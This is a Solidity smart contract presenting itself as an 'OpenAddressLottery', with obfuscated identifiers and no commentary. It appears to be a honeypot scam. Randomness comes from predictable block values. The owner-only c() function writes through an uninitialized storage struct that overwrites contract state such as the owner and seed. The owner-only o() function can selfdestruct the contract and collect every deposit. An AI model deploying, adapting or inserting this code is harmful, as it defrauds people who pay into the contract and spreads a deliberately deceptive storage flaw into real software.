contract OpenAddressLottery{
    struct SeedComponents{
        uint g;
        uint e;
        uint j;
        uint i;
    }

    address n;
    uint private h;
    uint private d;
    uint LuckyNumber = 7;

    mapping (address => bool) m;

    function OpenAddressLottery() {
        n = msg.sender;
        l(SeedComponents((uint)(block.coinbase), block.difficulty, block.gaslimit, block.timestamp));
    }

    function b() payable {
        if(msg.value<0.1 ether)
            return;


        require(m[msg.sender] == false);

        if(a(msg.sender) == LuckyNumber){
            m[msg.sender] = true;

            uint q=msg.value*7;

            if(q>this.balance)
                q=this.balance;
            msg.sender.transfer(q);
        }

        if(block.number-d>1000)
            l(SeedComponents((uint)(block.coinbase), block.difficulty, block.gaslimit, block.timestamp));
    }

    function a(address p) constant returns(uint n){

        n = uint(k(uint(p), h)[0]) % 8;
    }

    function l(SeedComponents f) internal {
        h = uint256(k(
            f.g,
            f.e,
            f.j,
            f.i
        ));
        d = block.number;
    }

    function o() {
        require(msg.sender==n);

        selfdestruct(msg.sender);
    }

    function c() {
        require(msg.sender==n);

        SeedComponents s;
        s.g = uint(msg.sender);
        s.e = uint256(block.blockhash(block.number - 1));
        s.j = block.difficulty*(uint)(block.coinbase);
        s.i = tx.gasprice * 7;

        l(s);
    }

    function () payable {
        if(msg.value>=0.1 ether && msg.sender!=n)
            b();
    }

}